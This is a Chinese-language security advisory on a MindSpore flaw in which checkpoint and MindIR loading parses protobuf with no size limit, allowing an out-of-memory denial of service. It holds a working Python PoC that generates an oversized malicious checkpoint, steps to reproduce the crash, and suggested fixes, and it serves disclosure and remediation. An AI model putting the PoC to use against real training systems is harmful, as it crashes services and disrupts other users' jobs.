# MS-2025-004: Protobuf 解析无大小限制导致 OOM DoS

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) |
| **版本** | 2.4.0rc1 (main branch 截至 2026-05-19) |
| **严重性** | Medium |
| **CVSS 3.1** | 5.5 (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H) |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地/需要用户加载恶意模型/checkpoint 文件 |
| **影响组件** | `mindspore/python/mindspore/train/serialization.py`, `mindspore/core/load_mindir/load_model.cc` |

## 漏洞概述

MindSpore 在加载 checkpoint (`.ckpt`) 和 MindIR (`.mindir`) 文件时，使用 protobuf 的 `ParseFromString()` 直接解析文件全部内容，**没有设置 `SetTotalBytesLimit` 或任何大小上限校验**。

攻击者可以构造一个包含超大 repeated field 或深度嵌套的恶意 protobuf 文件，导致：
1. 内存耗尽（OOM）→ 进程崩溃
2. 在训练平台场景中，可能影响同节点上其他训练任务

## 漏洞代码

### Python 层

**文件**: `mindspore/python/mindspore/train/serialization.py` (第1428行)

```python
def _parse_ckpt_proto(ckpt_file_name, dec_key, dec_mode, crc_check):
    """Parse checkpoint protobuf."""
    checkpoint_list = Checkpoint()
    try:
        with _ckpt_fs.open(ckpt_file_name, *_ckpt_fs.open_args) as f:
            pb_content = f.read()  # ← 读取全部文件到内存
        # ...
        checkpoint_list.ParseFromString(pb_content)  # ← 无大小限制！
```

**文件**: `mindspore/python/mindspore/train/_utils.py` (第247行)

```python
    with open(file_name, "rb") as f:
        pb_content = f.read()
        model.ParseFromString(pb_content)  # ← 无大小限制！
```

### C++ 层

**文件**: `mindspore/core/load_mindir/load_model.cc`
- 在 C++ 层加载 MindIR 时同样没有设置 protobuf CodedInputStream 的 `SetTotalBytesLimit`

## PoC 构造

```python
"""
构造一个恶意 checkpoint 文件，包含大量 repeated field
触发 OOM
"""
from mindspore.train.checkpoint_pb2 import Checkpoint
import struct

def create_oom_checkpoint(output_path, target_size_mb=2048):
    """
    创建一个看似合法但会导致 OOM 的 checkpoint 文件
    方法：在 protobuf 中嵌入大量大 tensor_content
    """
    ckpt = Checkpoint()
    
    # 每个 value 的 tensor_content 设为 1MB
    chunk_size = 1024 * 1024  # 1MB
    num_chunks = target_size_mb
    
    for i in range(num_chunks):
        value = ckpt.value.add()
        value.tag = f"param_{i}"
        # 设置 tensor_content 为大块数据
        value.tensor.tensor_type = "Float32"
        value.tensor.dims.extend([chunk_size // 4])  # float32
        value.tensor.tensor_content = b'\x00' * chunk_size
    
    with open(output_path, "wb") as f:
        f.write(ckpt.SerializeToString())
    
    print(f"[+] 恶意 checkpoint 已创建: {output_path}")
    print(f"[+] 文件大小: ~{target_size_mb} MB")
    print(f"[+] 加载时将尝试在内存中展开为更大的数据结构")

# 注意：实际 PoC 可以用更小的文件触发更大的内存分配
# 利用 protobuf 的 varint 编码特性，小文件可以声明巨大的 repeated count
create_oom_checkpoint("./dos_checkpoint.ckpt", target_size_mb=512)
```

## 本地复现

```bash
# Step 1: 创建恶意文件
python3 create_oom_ckpt.py

# Step 2: 监控内存并加载
# 限制内存避免真正 OOM
ulimit -v 4194304  # 4GB 虚拟内存限制

python3 -c "
import mindspore as ms
try:
    ms.load_checkpoint('./dos_checkpoint.ckpt')
except MemoryError:
    print('OOM triggered - DoS successful')
except Exception as e:
    print(f'Error: {e}')
"
```

## 修复建议

### Python 层

```python
import os

MAX_CHECKPOINT_SIZE = 10 * 1024 * 1024 * 1024  # 10GB 合理上限
MAX_MINDIR_SIZE = 10 * 1024 * 1024 * 1024

def _parse_ckpt_proto(ckpt_file_name, dec_key, dec_mode, crc_check):
    checkpoint_list = Checkpoint()
    try:
        file_size = os.path.getsize(ckpt_file_name)
        if file_size > MAX_CHECKPOINT_SIZE:
            raise ValueError(f"Checkpoint file too large: {file_size} bytes "
                           f"(max: {MAX_CHECKPOINT_SIZE} bytes)")
        # ... existing logic ...
```

### C++ 层

```cpp
// 使用 CodedInputStream 设置解析限制
#include <google/protobuf/io/coded_stream.h>

google::protobuf::io::ArrayInputStream input(data, data_size);
google::protobuf::io::CodedInputStream coded_input(&input);
coded_input.SetTotalBytesLimit(MAX_MINDIR_SIZE);  // 设置上限

if (!model.ParseFromCodedStream(&coded_input)) {
    MS_LOG(ERROR) << "Failed to parse MindIR model (size limit exceeded or corrupt data).";
    return nullptr;
}
```

## 参考

- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [Protobuf Security Best Practices](https://protobuf.dev/programming-guides/dos-mitigation/)
- [CVE-2024-7254: Protobuf stack overflow in recursive parsing](https://nvd.nist.gov/vuln/detail/CVE-2024-7254)
